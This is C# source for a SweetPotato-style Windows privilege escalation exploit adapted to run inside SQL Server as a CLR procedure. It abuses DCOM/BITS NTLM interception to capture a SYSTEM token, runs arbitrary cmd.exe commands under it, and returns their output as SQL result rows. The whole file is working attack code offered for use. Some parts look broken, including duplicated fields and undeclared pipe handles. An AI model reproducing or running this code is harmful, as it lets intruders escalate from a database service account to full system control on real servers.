using Microsoft.SqlServer.Server;
using Microsoft.Win32;
using Mono.Options;
using System;
using System.Data;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Threading;
using static SweetPotato.ImpersonationToken;

namespace SweetPotato {
    class Program {

        byte[] buf = new byte[BUFSIZE];
        int dwRead = 0;
        byte[] outBytes;

        static void PrintHelp(OptionSet options) {                
            options.WriteOptionDescriptions(Console.Out);
        }

        static bool IsBITSRequired() {

            if(Environment.OSVersion.Version.Major < 10) {
                return false;
            }

            RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion");
            var buildNumber = UInt32.Parse(registryKey.GetValue("ReleaseId").ToString());

            if(buildNumber <= 1809) {
                return false;
            }

            return true;        
        }

        static void sendrow(string text) {

            SqlDataRecord rec = new SqlDataRecord(new SqlMetaData[] {
                new SqlMetaData("output",SqlDbType.Text,-1)
            });
            SqlContext.Pipe.SendResultsStart(rec);
            rec.SetSqlString(0, text);
            SqlContext.Pipe.SendResultsRow(rec);
            SqlContext.Pipe.SendResultsEnd();

        }

        //public static void OriginMain(string[] args) {
        public static void OriginMain(string cmd)
        {

            string clsId = "4991D34B-80A1-4291-83B6-3328366B9097";
            ushort port = 6666;
            string program = @"c:\Windows\System32\cmd.exe";
            //string program = @"sqlps.exe";
            string programArgs = null;
            ExecutionMethod executionMethod = ExecutionMethod.Auto;
            bool showHelp = false;
            bool isBITSRequired = false;
            bool flag = false;

            programArgs = cmd;


            try {

                if ( isBITSRequired = IsBITSRequired()) {
                    clsId = "4991D34B-80A1-4291-83B6-3328366B9097";

                }

                bool hasImpersonate = EnablePrivilege(SecurityEntity.SE_IMPERSONATE_NAME);
                bool hasPrimary = EnablePrivilege(SecurityEntity.SE_ASSIGNPRIMARYTOKEN_NAME);
                bool hasIncreaseQuota = EnablePrivilege(SecurityEntity.SE_INCREASE_QUOTA_NAME);

                if(!hasImpersonate && !hasPrimary) {

                    sendrow("[!] Cannot perform NTLM interception, neccessary priveleges missing.  Are you running under a Service account?");
                    return;
                }

                if (executionMethod == ExecutionMethod.Auto) {
                    if (hasImpersonate) {
                        executionMethod = ExecutionMethod.Token;
                    } else if (hasPrimary) {
                        executionMethod = ExecutionMethod.User;
                    }
                }



                PotatoAPI potatoAPI = new PotatoAPI(new Guid(clsId), port, isBITSRequired);

                if (!potatoAPI.TriggerDCOM()) {

                    sendrow("[!] No authenticated interception took place, exploit failed");
                    return;
                }



                IntPtr impersonatedPrimary;
                if (!DuplicateTokenEx(potatoAPI.Token, TOKEN_ALL_ACCESS, IntPtr.Zero,
                    SECURITY_IMPERSONATION_LEVEL.SecurityIdentification, TOKEN_TYPE.TokenPrimary, out impersonatedPrimary)) {

                    sendrow("[!] Failed to impersonate security context token");
                    return;
                }

                SECURITY_ATTRIBUTES saAttr = new SECURITY_ATTRIBUTES();
                saAttr.nLength = Marshal.SizeOf(typeof(SECURITY_ATTRIBUTES));
                saAttr.bInheritHandle = 0x1;
                saAttr.lpSecurityDescriptor = IntPtr.Zero;

                if(!CreatePipe(ref out_read, ref out_write, ref saAttr, 0))
                {


                    //Console.WriteLine("[+] CreatePipe success");
                    //SqlContext.Pipe.Send("[!] CreatePipe failed");
                    sendrow("[!] CreatePipe failed");
                }

                SetHandleInformation(out_read, HANDLE_FLAG_INHERIT, 0);
                SetHandleInformation(err_read, HANDLE_FLAG_INHERIT, 0);

                byte[] buf = new byte[BUFSIZE];
                int dwRead = 0;
                byte[] outBytes;

                //无意义的多线程
                //Thread systemThread = new Thread(() =>
                //{
                    SetThreadToken(IntPtr.Zero, potatoAPI.Token);
                    STARTUPINFO si = new STARTUPINFO();
                    PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
                    si.cb = Marshal.SizeOf(si);
                    si.lpDesktop = @"WinSta0\Default";
                    si.hStdOutput = out_write;
                    si.hStdError = err_write;
                    si.dwFlags |= STARTF_USESTDHANDLES;
                    //Console.WriteLine("[+] Created launch thread using impersonated user {0}", WindowsIdentity.GetCurrent(true).Name);

                    string finalArgs = null;

                    if (programArgs != null)
                    {
                        if (program.Equals("c:\\Windows\\System32\\cmd.exe")) { 
                            programArgs = "/c " + programArgs; 
                        }
                        finalArgs = string.Format("\"{0}\" {1}", program, programArgs);
                        //Console.WriteLine("[+] Command : {0} ", finalArgs);
                    }
                    if (executionMethod == ExecutionMethod.Token)
                    {
                        flag = CreateProcessWithTokenW(potatoAPI.Token, 0, program, finalArgs, CREATE_NO_WINDOW, IntPtr.Zero, null, ref si, out pi);
                        //Console.WriteLine("[+] process with pid: {0} created.\n\n=====================================\n", pi.dwProcessId);
                        if (!flag)
                        {

                        sendrow("[!] Failed to created impersonated process with token: " + Marshal.GetLastWin32Error());
                            return;
                        }
                    }
                    else
                    {
                        flag = CreateProcessAsUserW(impersonatedPrimary, program, finalArgs, IntPtr.Zero,
                            IntPtr.Zero, false, CREATE_NO_WINDOW, IntPtr.Zero, @"C:\", ref si, out pi);

                        if (!flag)
                        {
                            sendrow("[!] Failed to created impersonated process with user: {0} " + Marshal.GetLastWin32Error());
                            return;
                        }
                    }
                    CloseHandle(out_write);
                    
                   while (ReadFile(out_read, buf, BUFSIZE, ref dwRead, IntPtr.Zero))
                    {
                        outBytes = new byte[dwRead];
                        Array.Copy(buf, outBytes, dwRead);
                    sendrow(System.Text.Encoding.Default.GetString(outBytes));


                    }
                    CloseHandle(out_read);

                

                return;
            }
            catch (Exception e) {

                sendrow("[!] Failed to exploit COM: " + e.Message + " " + e.StackTrace.ToString());
            }
        }
    }
}
